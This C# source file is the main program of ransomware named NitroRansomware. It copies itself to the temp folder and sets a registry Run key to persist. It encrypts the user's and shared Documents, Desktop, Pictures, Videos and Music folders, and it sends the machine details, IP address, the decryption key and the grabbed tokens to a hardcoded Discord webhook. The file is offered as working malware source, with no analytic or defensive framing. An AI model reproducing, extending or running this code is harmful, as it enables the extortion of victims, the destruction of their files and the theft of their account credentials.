using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NitroRansomware;

internal class Program
{
	private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

	private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private static string pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);

	private static string videos = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);

	private static string music = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);

	private static string commonDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);

	private static string commonDocuments = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);

	private static string commonVideos = Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos);

	private static string commonMusic = Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic);

	private static string commonPictures = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);

	public static string WEBHOOK = "https://discord.com/api/webhooks/861522158810562591/mKUW4ANhubV9YQE0HI84efsDlLYOJYWuBKIROrolySbr31fXgCiBr1yieEH_Sdzx7vwT";

	public static string DECRYPT_PASSWORD = "ZGVmYXVsdHBhc3N3b3Jk";

	private static Logs logging = new Logs("DEBUG", 0);

	private static Webhook ww = new Webhook(WEBHOOK);

	private static void Main(string[] args)
	{
		if (Installed())
		{
			Application.Run((Form)(object)new Form1());
			return;
		}
		Duplicate();
		StartUp();
		Setup();
		EncryptAll();
		Temp();
		Thread.Sleep(6000);
		Application.Run((Form)(object)new Form1());
	}

	private static void Setup()
	{
		logging.Debug("Setup start");
		List<string> list = Grabber.Grab();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + "\n";
		}
		Console.WriteLine(text);
		List<string> details = User.GetDetails();
		string identifier = User.GetIdentifier();
		string iP = User.GetIP();
		Webhook webhook = new Webhook(WEBHOOK);
		webhook.Send("**Program executed** ```Status: Active \nPC Name: " + details[0] + "\nUser:" + details[1] + "\nUUID: " + identifier + "\nIP Address: " + iP + "```");
		webhook.Send("```Decryption Key: " + DECRYPT_PASSWORD + "```");
		webhook.Send("```Tokens:\n" + text + "```");
	}

	public static void EncryptAll()
	{
		ww.Send("```Starting file encryption..```");
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(desktop);
		});
		Thread thread4 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(videos);
		});
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(music);
		});
		Thread thread6 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(commonMusic);
		});
		Thread thread7 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(commonDocuments);
		});
		Thread thread8 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(commonDesktop);
		});
		Thread thread9 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(commonPictures);
		});
		Thread thread10 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(commonVideos);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread4.Start();
		thread5.Start();
		thread6.Start();
		thread7.Start();
		thread8.Start();
		thread9.Start();
		thread10.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		thread4.Join();
		thread5.Join();
		thread6.Join();
		thread7.Join();
		thread8.Join();
		thread9.Join();
		thread10.Join();
		ww.Send($"```Finished encrypting victim's files. Total number of files encrypted: {Crypto.encryptedFileLog.Count}```");
		Wallpaper.ChangeWallpaper();
	}

	public static void DecryptAll()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(desktop);
		});
		Thread thread4 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(videos);
		});
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(music);
		});
		Thread thread6 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(commonMusic);
		});
		Thread thread7 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(commonDocuments);
		});
		Thread thread8 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(commonDesktop);
		});
		Thread thread9 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(commonPictures);
		});
		Thread thread10 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(commonVideos);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread4.Start();
		thread5.Start();
		thread6.Start();
		thread7.Start();
		thread8.Start();
		thread9.Start();
		thread10.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		thread4.Join();
		thread5.Join();
		thread6.Join();
		thread7.Join();
		thread8.Join();
		thread9.Join();
		thread10.Join();
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("NR", "\"" + text2 + "\"");
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
	}

	public static void RemoveStart()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
			{
				registryKey.DeleteValue("NR", throwOnMissingValue: false);
			}
		}
	}

	private static void Duplicate()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + ".exe";
			File.Copy(Path.Combine(Environment.CurrentDirectory, text), Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			logging.Debug(ex.Message);
		}
	}

	private static bool Installed()
	{
		if (Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", "NR", null) != null)
		{
			return true;
		}
		return false;
	}

	private static void Temp()
	{
		string text = Path.GetTempPath() + "NR_decrypt.txt";
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(DECRYPT_PASSWORD);
	}
}
